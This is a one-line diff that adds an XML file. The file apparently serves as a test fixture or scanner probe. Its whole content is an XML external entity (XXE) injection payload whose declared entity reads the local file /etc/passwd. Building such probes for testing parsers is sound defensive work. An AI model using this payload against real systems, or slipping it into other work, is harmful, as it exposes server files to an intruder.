@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY probe SYSTEM "file:///etc/passwd">]><data>&probe;</data>
